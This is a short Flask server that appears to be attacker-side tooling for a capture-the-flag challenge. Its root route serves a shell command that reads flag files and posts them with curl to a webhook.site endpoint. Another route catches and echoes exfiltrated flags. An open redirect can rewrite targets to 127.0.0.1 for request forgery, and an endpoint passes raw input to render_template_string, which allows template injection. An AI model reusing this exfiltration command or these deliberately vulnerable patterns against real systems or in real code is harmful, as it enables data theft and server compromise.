import time
from flask import Flask, request, redirect, render_template_string
from flask_cors import CORS

app = Flask(__name__)
CORS(app)

def validate_filename(filename: str):
    banned = ['..', '/', '~']
    for substring in banned:
        if substring in filename:
            return False
    return True

@app.route('/', methods=['POST'])
def get_index():
    return 'cat flag/*/* | curl -X POST --data-binary @- https://webhook.site/3ac78532-8d8b-4257-8593-3ee232134985', 200

@app.route('/@www.google.com', methods=['GET'])
def get_pwc():
    flag = request.args.get('flag')
    return 'flagnya: ' + flag

@app.route('/redirect')
def redirect_page():
    url = request.args.get('url', None)
    if not url:
        return 'Invalid url', 400
    if '{HOST}' in url:
        to_local = request.args.get('to-local', None)
        if to_local is not None:
            url = url.replace('{HOST}', '127.0.0.1')
    if '{PORT}' in url:
        port = request.args.get('port', None)
        if port is not None:
            url = url.replace('{PORT}', port)
    return redirect(url)

@app.route('/error')
def get_error():
    time.sleep(5)
    return 'Error', 404

@app.route('/static/<filename>')
def get_static(filename):
    if not validate_filename(filename):
        return 'Invalid filename', 400
    with open('static/' + filename, 'r') as file:
        content = file.read()
    return content, 200
    
@app.route('/ssti')
def ssti():
    contents = request.args.get('contents')
    return render_template_string(contents)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
    